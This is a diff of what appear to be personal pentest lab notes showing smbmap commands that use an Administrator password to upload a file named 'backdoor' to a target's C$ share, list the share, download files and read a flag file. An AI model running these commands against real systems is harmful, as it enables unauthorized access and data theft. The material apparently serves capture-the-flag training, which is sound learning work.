@@ -540,6 +540,18 @@ Based on this output, we can see that there are several services running on the 
 	  
 8. Lets try the following: 
 	1. create a file called backdoor: *touch backdoor*  check with ls to see if the file exist 
-	2.  run the following command: *smbmap -H {taget ip} -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor'  * 
-				- --upload '/root/backdoor' 'C$\backdoor'`: This option is used to upload a file from the local machine to the remote server. It specifies the source file path (`/root/backdoor`) on the local machine and the destination file path (`C$\backdoor`) on the remote server. In this example, it is attempting to upload the file located at `/root/backdoor` to the `C:\backdoor` path on the remote server.
-	1. 
+	2.  run the following command: *smbmap -H {taget ip} -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor'* 
+			--upload '/root/backdoor' C$ backdoor: This option is used to upload a file from the local machine to the remote server. It specifies the source file path (`/root/backdoor`) on the local machine and the destination file path (`C$\backdoor`) on the remote server. In this example, it is attempting to upload the file located at `/root/backdoor` to the `C:\backdoor` path on the remote server.
+	3. Now check if you successfully uploaded the file: *smbmap -H {taget ip} -u Administrator -p 'smbserver_771' -r 'C$'*
+		 - `-r 'C$'` specifies the share name to be enumerated, in this case, the "C$" administrative share.  ![[Pasted image 20230512152628.png]]
+		 - If sucessfull then that means that you can upload a file. 
+		4. Check if you can download a file: *smbmap -H {taget ip} -u Administrator -p 'smbserver_771' --download 'C$\{filename.extention}'* 
+		5. ls to see if download is complete 
+		6. read the file: *cat filename
+
+
+
+
+
+
+cat 10.4.26.58-C_flag.txt 
